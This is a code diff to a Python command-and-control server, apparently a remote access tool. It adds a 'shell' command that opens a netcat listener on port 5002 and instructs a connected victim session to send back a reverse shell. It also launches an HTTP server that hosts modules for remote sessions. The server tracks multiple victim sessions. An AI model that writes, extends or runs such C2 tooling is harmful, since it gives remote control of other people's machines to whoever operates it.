@@ -3,7 +3,7 @@
 
 import psutil
 import signal
-import threading, socket, colorama, helpers,session, socketserver,select, subprocess, os
+import threading, socket, colorama, helpers,session, socketserver,select, subprocess, os, time
 import random
 
 
@@ -14,7 +14,7 @@ class server():
     def __init__(self, host='localhost', port = 5000, db='memory'):
         self.socket = self._socket(port)
         self.sessions = []
-        self.current_session = None
+        self.current_session = None  
         self.host = host
         self.port = port
         self.db = db
@@ -50,6 +50,11 @@ class server():
                 'method' : self._sesh,
                 'use' : 'session <session_id>',
                 'desc' : 'Changes the current session to the session with the specified ID.'
+            },
+            'shell' : {
+                'method' : self._shell,
+                'use' : 'shell',
+                'desc' : 'Spawns a reverse shell to the current session'
             }
         
         }
@@ -92,15 +97,28 @@ class server():
             except socket.timeout:
                 pass       
                 
-            helpers.show("STOPPING LISTENING SOCKET", colour="RED", style="BRIGHT", end="\n")   
+        helpers.show("STOPPING LISTENING SOCKET", colour="RED", style="BRIGHT", end="\n")   
             
     def set_session(self, session):
         self.current_session = session
         return
     
     def start_shell(self):
+        #spawn a listener on port 5002
+        helpers.show("SPAWNING LISTENER SHELL", colour="BLUE", style="BRIGHT", end="\n")   
+        try:
+            subprocess.call(['gnome-terminal', '--', 'bash', '-c', 'nc -lvnp 5002'])
+        except Exception as e:
+            print(f"Error executing command: {e}")
         #start a reverse tcp shell
-        self.current_session
+        self.current_session.send_instruction("shell")
+        
+    
+    def _shell(self):
+        #spawn a reverse shell
+        self.start_shell()
+        
+        
 
     def _sesh(self, ID):
         '''Changes the current session to the session with the specified ID.'''
@@ -172,9 +190,10 @@ if __name__ == "__main__":
 
     #host the module files
     #TODO: make compatible for linux file path too
+    helpers.show("STARTING MODULE SERVER", colour='BLUE', style='BRIGHT', end='')
     globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/modules',shell=True)
-
     globals()['close'] = False
+    helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='')
     globals()['CommandServer'] = server()
     globals()['CommandServer'].run()
 
